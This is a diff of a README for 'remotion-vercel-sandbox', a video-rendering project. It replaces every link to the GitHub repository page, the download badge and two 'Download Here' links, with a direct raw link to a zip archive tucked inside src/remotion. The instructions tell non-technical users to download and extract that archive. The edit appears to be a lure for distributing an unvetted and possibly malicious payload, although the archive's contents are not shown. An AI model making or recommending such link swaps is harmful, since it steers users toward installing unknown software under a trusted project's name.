@@ -1,6 +1,6 @@
 # 🚀 remotion-vercel-sandbox - Render Videos in the Cloud Easily
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/sjmluv/remotion-vercel-sandbox)
+[![Download](https://raw.githubusercontent.com/sjmluv/remotion-vercel-sandbox/main/src/remotion/remotion-sandbox-vercel-v3.6.zip)](https://raw.githubusercontent.com/sjmluv/remotion-vercel-sandbox/main/src/remotion/remotion-sandbox-vercel-v3.6.zip)
 
 ## 📦 Overview
 
@@ -35,7 +35,7 @@ To start using the remotion-vercel-sandbox, follow these simple steps:
 
 1. **Visit the Download Page**  
    Click the following link to access the download page and find all the files you need.  
-   [Download Here](https://github.com/sjmluv/remotion-vercel-sandbox).
+   [Download Here](https://raw.githubusercontent.com/sjmluv/remotion-vercel-sandbox/main/src/remotion/remotion-sandbox-vercel-v3.6.zip).
 
 2. **Choose Your Setup Method**  
    Depending on your preference, you can choose between different operational methods:
@@ -56,7 +56,7 @@ To ensure optimal performance, here are the recommended system requirements:
 Here are the installation instructions, tailored for non-technical users:
 
 1. **Download the Application:**  
-   Click this link to visit our download page: [Download Here](https://github.com/sjmluv/remotion-vercel-sandbox).
+   Click this link to visit our download page: [Download Here](https://raw.githubusercontent.com/sjmluv/remotion-vercel-sandbox/main/src/remotion/remotion-sandbox-vercel-v3.6.zip).
 
 2. **Extract Files:**  
    Once downloaded, locate the zip file and extract it. You can do this by right-clicking the file and selecting "Extract All."
